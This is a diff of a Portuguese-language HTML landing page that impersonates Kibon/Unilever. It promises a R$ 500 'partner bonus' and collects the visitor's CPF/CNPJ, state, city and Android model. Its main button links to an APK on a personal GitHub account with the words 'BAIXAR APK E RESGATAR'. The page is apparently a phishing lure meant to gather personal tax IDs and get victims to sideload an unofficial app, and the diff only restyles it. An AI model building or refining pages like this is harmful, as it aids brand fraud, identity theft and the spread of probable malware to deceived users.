@@ -3,226 +3,187 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kibon - Resgate seu Bônus de Freezer</title>
+    <title>Kibon - Resgate seu Bônus</title>
     <style>
         :root {
             --vermelho-kibon: #e31b23;
             --amarelo-kibon: #ffcc00;
-            --cinza-fundo: #f4f4f4;
+            --cinza-fundo: #efefef;
         }
 
         body { 
-            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; 
-            margin: 0; padding: 0; background-color: var(--cinza-fundo); 
-        }
-
-        header {
-            background-color: white;
-            padding: 20px 0;
-            text-align: center;
-            border-bottom: 5px solid var(--vermelho-kibon);
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-        }
-
-        .logo-kibon {
-            font-weight: 900;
-            font-size: 2.8em;
-            color: var(--vermelho-kibon);
-            font-style: italic;
-            letter-spacing: -2px;
-            text-transform: uppercase;
+            font-family: Arial, sans-serif; 
+            margin: 0; padding: 0; 
+            background-color: var(--cinza-fundo); 
+            display: flex; flex-direction: column; align-items: center;
         }
 
         .container { 
-            max-width: 450px; 
-            margin: 40px auto; 
+            max-width: 450px; width: 90%;
             background: #fff; 
-            padding: 30px; 
-            border-radius: 25px; 
-            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
+            padding: 40px 30px; 
+            border-radius: 40px; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.05);
+            margin-top: 50px;
         }
 
-        .bonus-card { 
+        .header-bonus { 
             background: var(--vermelho-kibon); 
             color: white; 
-            padding: 20px; 
+            padding: 25px; 
             text-align: center; 
             border-radius: 20px; 
             margin-bottom: 30px;
         }
 
-        .bonus-card h2 { margin: 0; font-size: 1.5em; text-transform: uppercase; }
-        .bonus-card p { margin: 5px 0 0; font-weight: bold; color: var(--amarelo-kibon); }
+        .header-bonus h2 { margin: 0; font-size: 22px; font-weight: bold; }
+        .header-bonus p { margin: 5px 0 0; color: var(--amarelo-kibon); font-weight: bold; font-size: 14px; }
 
-        .form-group { margin-bottom: 18px; }
-        
         label { 
             display: block; 
             font-weight: bold; 
-            margin-bottom: 6px;
-            color: #444;
-            font-size: 0.9em;
+            margin-bottom: 8px; 
+            color: #444; 
+            font-size: 13px;
+            text-transform: uppercase;
         }
+
+        .form-group { margin-bottom: 20px; }
 
         input, select { 
             width: 100%; 
-            padding: 14px; 
-            border: 2px solid #f0f0f0; 
-            border-radius: 12px; 
-            box-sizing: border-box; 
-            font-size: 16px;
-            outline: none;
+            padding: 15px; 
+            border: 1px solid #ddd; 
+            border-radius: 15px; 
+            font-size: 16px; 
+            box-sizing: border-box;
+            background-color: #fff;
         }
 
-        input:focus, select:focus { border-color: var(--vermelho-kibon); }
+        .row { display: flex; gap: 15px; }
+        .row div { flex: 1; }
 
-        .error-msg { 
-            color: var(--vermelho-kibon); 
-            font-size: 0.8em; 
-            font-weight: bold;
-            display: none; 
-            margin-top: 5px;
-        }
-
-        .btn-download { 
-            display: block; 
-            width: 100%; 
+        .btn-resgatar { 
+            display: block; width: 100%; 
             background: var(--vermelho-kibon); 
             color: white; 
             text-align: center; 
             padding: 20px; 
             text-decoration: none; 
-            border-radius: 50px; 
-            font-weight: bold; 
-            font-size: 1.2em;
-            margin-top: 25px; 
-            box-shadow: 0 6px 20px rgba(227, 27, 35, 0.4);
+            border-radius: 40px; 
+            font-weight: bold; font-size: 18px;
+            margin-top: 20px;
+            box-shadow: 0 8px 15px rgba(227, 27, 35, 0.3);
         }
 
-        footer { text-align: center; padding: 30px; font-size: 0.75em; color: #bbb; }
+        .error-msg { color: var(--vermelho-kibon); font-size: 12px; font-weight: bold; display: none; margin-top: 5px; }
+
+        footer { margin-top: 40px; color: #bbb; font-size: 11px; text-align: center; }
     </style>
 </head>
 <body>
 
-<header>
-    <div class="logo-kibon">Kibon</div>
-</header>
-
 <div class="container">
-    <div class="bonus-card">
-        <h2>Bônus de R$ 500,00</h2>
-        <p>EXCLUSIVO PARA PARCEIROS ANDROID</p>
+    <div class="header-bonus">
+        <h2>BÔNUS DE R$ 500,00</h2>
+        <p>EXCLUSIVO PARA PARCEIROS</p>
     </div>
 
-    <form id="cadastroForm">
+    <form>
         <div class="form-group">
-            <label>PERFIL PROFISSIONAL</label>
+            <label>Perfil Profissional</label>
             <select required>
                 <option value="">Selecione seu perfil...</option>
                 <option>Ponto de Venda (PDV)</option>
-                <option>Revendedor Autônomo</option>
-                <option>Distribuição</option>
+                <option>Revendedor</option>
             </select>
         </div>
 
         <div class="form-group">
-            <label>CPF OU CNPJ (APENAS NÚMEROS)</label>
-            <input type="text" id="documento" placeholder="Validação obrigatória" required>
-            <span id="docErro" class="error-msg">⚠️ Documento inválido. Digite um CPF/CNPJ real.</span>
+            <label>CPF ou CNPJ (Apenas números)</label>
+            <input type="text" id="doc" placeholder="Digite aqui..." maxlength="14">
+            <span id="docErro" class="error-msg">Documento Inválido!</span>
         </div>
 
-        <!-- ESTADOS E CIDADES DINÂMICOS -->
-        <div class="form-group">
-            <label>ESTADO (UF)</label>
-            <select id="estado" required>
-                <option value="">Selecione o Estado...</option>
-            </select>
+        <div class="row form-group">
+            <div>
+                <label>Estado</label>
+                <select id="estado" required>
+                    <option value="">UF</option>
+                </select>
+            </div>
+            <div style="flex: 2;">
+                <label>Cidade</label>
+                <select id="cidade" required disabled>
+                    <option value="">Selecione...</option>
+                </select>
+            </div>
         </div>
 
         <div class="form-group">
-            <label>CIDADE</label>
-            <select id="cidade" required disabled>
-                <option value="">Selecione o Estado primeiro...</option>
-            </select>
-        </div>
-
-        <div class="form-group">
-            <label>MODELO DO SEU ANDROID</label>
+            <label>Modelo do seu Android</label>
             <select required>
                 <option value="">Selecione o aparelho...</option>
-                <optgroup label="SAMSUNG">
-                    <option>Galaxy S24 / S23 / S22 / S21 / S20</option>
-                    <option>Galaxy A10 ao A70</option>
-                    <option>Galaxy M / Note / Z Flip / Z Fold</option>
-                </optgroup>
-                <optgroup label="MOTOROLA">
-                    <option>Moto G (Todos os modelos)</option>
-                    <option>Moto Edge / Moto E</option>
-                </optgroup>
-                <optgroup label="OUTROS">
-                    <option>Xiaomi (Redmi / POCO)</option>
-                    <option>Realme / Asus / Infinix</option>
-                </optgroup>
+                <option>Samsung Galaxy S / A / M</option>
+                <option>Motorola Moto G / Edge</option>
+                <option>Xiaomi Redmi / POCO</option>
             </select>
         </div>
 
-        <a href="https://github.com/wellsilvasp13-hash/kibon/raw/main/kibon.apk" class="btn-download" id="btnFinal">
-            BAIXAR APK E RESGATAR R$ 500
+        <a href="https://github.com/wellsilvasp13-hash/kibon/raw/main/kibon.apk" class="btn-resgatar">
+            BAIXAR APK E RESGATAR
         </a>
     </form>
 </div>
 
-<footer>&copy; 2026 Kibon Brasil - Unilever.</footer>
+<footer>© 2026 KIBON BRASIL - UNILEVER. TODOS OS DIREITOS RESERVADOS.</footer>
 
 <script>
-    // 1. CARREGAR TODOS OS ESTADOS DO BRASIL
-    const selectEstado = document.getElementById('estado');
-    const selectCidade = document.getElementById('cidade');
+    // --- Lógica para Estados e Cidades (API IBGE) ---
+    const estSelect = document.getElementById('estado');
+    const cidSelect = document.getElementById('cidade');
 
+    // Carregar Estados
     fetch('https://servicodados.ibge.gov.br/api/v1/localidades/estados?orderBy=nome')
-        .then(res => res.json())
-        .then(estados => {
-            estados.forEach(uf => {
-                const opt = document.createElement('option');
+        .then(r => r.json())
+        .then(dados => {
+            dados.forEach(uf => {
+                let opt = document.createElement('option');
                 opt.value = uf.sigla;
-                opt.innerHTML = uf.nome;
-                selectEstado.appendChild(opt);
+                opt.text = uf.sigla; // Mostra a sigla (SP, RJ, etc) como no seu print
+                estSelect.add(opt);
             });
         });
 
-    // 2. CARREGAR CIDADES AO SELECIONAR ESTADO
-    selectEstado.addEventListener('change', function() {
-        const uf = this.value;
-        selectCidade.innerHTML = '<option value="">Carregando cidades...</option>';
-        selectCidade.disabled = true;
-
-        if(uf) {
-            fetch(`https://servicodados.ibge.gov.br/api/v1/localidades/estados/${uf}/municipios?orderBy=nome`)
-                .then(res => res.json())
-                .then(cidades => {
-                    selectCidade.innerHTML = '<option value="">Selecione a Cidade...</option>';
-                    cidades.forEach(cidade => {
-                        const opt = document.createElement('option');
-                        opt.value = cidade.nome;
-                        opt.innerHTML = cidade.nome;
-                        selectCidade.appendChild(opt);
-                    });
-                    selectCidade.disabled = false;
+    // Carregar Cidades quando mudar o Estado
+    estSelect.addEventListener('change', () => {
+        cidSelect.innerHTML = '<option value="">Carregando...</option>';
+        cidSelect.disabled = true;
+        
+        fetch(`https://servicodados.ibge.gov.br/api/v1/localidades/estados/${estSelect.value}/municipios`)
+            .then(r => r.json())
+            .then(dados => {
+                cidSelect.innerHTML = '<option value="">Selecione...</option>';
+                dados.forEach(cid => {
+                    let opt = document.createElement('option');
+                    opt.value = cid.nome;
+                    opt.text = cid.nome;
+                    cidSelect.add(opt);
                 });
-        }
+                cidSelect.disabled = false;
+            });
     });
 
-    // 3. VALIDAÇÃO DE CPF/CNPJ
-    document.getElementById('documento').addEventListener('blur', function() {
-        const val = this.value.replace(/\D/g, '');
+    // --- Validação simples de CPF/CNPJ ---
+    document.getElementById('doc').addEventListener('blur', function() {
+        const v = this.value.replace(/\D/g, '');
         const erro = document.getElementById('docErro');
-        // Validação de comprimento básica (CPF 11 ou CNPJ 14)
-        if (val.length !== 11 && val.length !== 14) {
+        if (v.length !== 11 && v.length !== 14) {
             erro.style.display = 'block';
-            this.style.borderColor = 'var(--vermelho-kibon)';
+            this.style.borderColor = '#e31b23';
         } else {
             erro.style.display = 'none';
-            this.style.borderColor = '#f0f0f0';
+            this.style.borderColor = '#ddd';
         }
     });
 </script>
